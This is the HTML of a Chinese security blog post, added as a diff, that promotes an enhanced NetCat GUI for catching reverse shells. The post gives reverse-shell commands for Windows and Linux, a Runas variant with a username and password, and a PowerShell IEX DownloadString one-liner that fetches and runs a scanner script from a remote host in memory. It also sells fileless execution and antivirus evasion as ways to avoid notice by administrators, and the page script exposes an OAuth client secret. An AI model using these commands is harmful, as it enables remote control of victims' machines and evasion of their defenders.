@@ -1,0 +1,400 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="netcat">
+
+
+<meta name="description" content="K8加强版NC、NetCat,可监听执行windows\Linux\Mac等系统，或多种方式反弹的Shell,对于Windows还可以自动加密执行PowerShell、以及内存加载执行Ladon...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖工具〗NC执行PowerShell/内存加载Ladon扫描 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖工具〗NC执行PowerShell/内存加载Ladon扫描">
+            
+            〖工具〗NC执行PowerShell/内存加载Ladon扫描
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/netcat/" rel="tag">netcat</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/12/25</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1575</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>K8加强版NC、NetCat,可监听执行windows\Linux\Mac等系统，或多种方式反弹的Shell,对于Windows还可以自动加密执行PowerShell、以及内存加载执行Ladon扫描（无文件落地）</p>
+<span id="more"></span>
+<h3 id="背景">背景</h3>
+<p>由于最近使用的C2在执行CMD命令时，经常容易出现僵尸进程（无法结束必须结束宿主进程或重启机器），为了防止执行命令时出现僵尸进程导致被管理员发现，所以我采用反弹SHELL来执行命令的方法。</p>
+<h3 id="NC简介">NC简介</h3>
+<p>NetCat，简称Nc，是一款非常实用的网络工具，小巧而功能强大，被誉为网络安全界的“瑞士军刀”。NetCat被设计成一个可靠的后门工具，拥有功能丰富的网络调试和开发工具，它可以通过手工或者脚本与应用层的网络应用程序或服务进行交互，可以帮你轻易的建立几乎任何类型的连接。</p>
+<p>netcat在UNIX/LINUX/MAC等系统默认安装，所以现在依然是黑客必学的命令，功能很多，但现在大多数人估计也就只会用它来反弹。上一代或喜欢命令行下渗透的，可能比较熟悉使用NC的其它功能，什么端口扫描、监听、抓包等，由于现在我最多也就使用它来反弹，所以就弄个加强版的NC客户端，可监听来自WINDOWS、Linux、Mac等任意系统反弹的SHELL，针对Windows还可执行PowerShell命令、当然也支持渗透必备的Ladon。</p>
+<h3 id="加强版NC">加强版NC</h3>
+<p>NC客户端一般都放在VPS上或本地，所以此功能放在GUI里，这样使用起来很方便，特别是切换执行CMD、PowerShell、Ladon命令</p>
+<p>GUI 2020.12.25<br>
+[+] Netcat PowerShell命令加密执行<br>
+[+] Netcat 内存加载PowerLadon执行</p>
+<p>GUI 2020.12.16<br>
+[u] Netcat 兼容Linux或MAC反弹SHELL<br>
+[+] Netcat 执行命令历史记录</p>
+<h3 id="NC监听">NC监听</h3>
+<p>nc -lvp 4444</p>
+<p>LadonGUI监听，直接点击Listen即可</p>
+<h3 id="nc反弹">nc反弹</h3>
+<h4 id="windows">windows</h4>
+<p>nc -e cmd 192.168.1.110 4444</p>
+<h4 id="linux-mac">linux/mac</h4>
+<p>nc -e /bin/bash 192.168.1.110 4444</p>
+<h4 id="Ladon">Ladon</h4>
+<p>Ladon ReverseTcp 192.168.1.110 4444 nc</p>
+<h4 id="Runas">Runas</h4>
+<p>Ladon Runas k8gege k8gege520 cmd.exe 192.168.1.110 4444</p>
+<p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/RunasNC.PNG"></p>
+<h4 id="其它">其它</h4>
+<p>其它方法反弹，Ladon也支持</p>
+<h3 id="执行CMD命令">执行CMD命令</h3>
+<p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p>
+<h3 id="执行PowerShell命令-加密">执行PowerShell命令(加密)</h3>
+<p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>
+勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>
+当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br>
+<img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/ncpowershell.PNG"></p>
+<h3 id="一键搭建WEB服务器">一键搭建WEB服务器</h3>
+<p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br>
+<img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/Ladon_web.PNG"></p>
+<h3 id="远程内存加载Ladon扫描">远程内存加载Ladon扫描</h3>
+<p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>
+执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br>
+<img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/NC_PowerLadon.PNG"></p>
+<h3 id="Cmd远程加载Ladon">Cmd远程加载Ladon</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></tbody></table></figure>
+<p>适用于还没跟上时代的远控或Shell只支持CMD交互,最大的优点是免杀、无文件落地，其它RAT也可以使用这种本文NC加载Ladon执行命令的方法，强化自己的C2/RAT/WebShell工具，不要说我只给CS写插件，而是很多shell工具我都考虑到了,你实现不了CS的程序集加载功能，也可以使用这个简单又很实用的方法。</p>
+<h3 id="Ladon下载">Ladon下载</h3>
+<p>PowerLadon: <a target="_blank" rel="noopener" href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>
+历史版本: <a target="_blank" rel="noopener" href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>
+7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>
+7.7版本：K8小密圈</p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/DiyPortBruteForce.html" class="pre-post btn btn-default" title="〖教程〗Ladon 7.8密码爆破自定义端口(SSH为例)">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Ladon 7.8密码爆破自定义端口(SSH为例)</span>
+    </a>
+    
+    
+    <a href="/p/k8ms17010exp.html" class="next-post btn btn-default" title="〖EXP〗NSA MS17010永恒之蓝漏洞一键工具">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖EXP〗NSA MS17010永恒之蓝漏洞一键工具</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E7%AE%80%E4%BB%8B"><span class="toc-text">NC简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%BC%BA%E7%89%88NC"><span class="toc-text">加强版NC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NC%E7%9B%91%E5%90%AC"><span class="toc-text">NC监听</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nc%E5%8F%8D%E5%BC%B9"><span class="toc-text">nc反弹</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#windows"><span class="toc-text">windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux-mac"><span class="toc-text">linux/mac</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ladon"><span class="toc-text">Ladon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Runas"><span class="toc-text">Runas</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83"><span class="toc-text">其它</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CCMD%E5%91%BD%E4%BB%A4"><span class="toc-text">执行CMD命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8CPowerShell%E5%91%BD%E4%BB%A4-%E5%8A%A0%E5%AF%86"><span class="toc-text">执行PowerShell命令(加密)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BAWEB%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="toc-text">一键搭建WEB服务器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDLadon%E6%89%AB%E6%8F%8F"><span class="toc-text">远程内存加载Ladon扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cmd%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDLadon"><span class="toc-text">Cmd远程加载Ladon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E4%B8%8B%E8%BD%BD"><span class="toc-text">Ladon下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
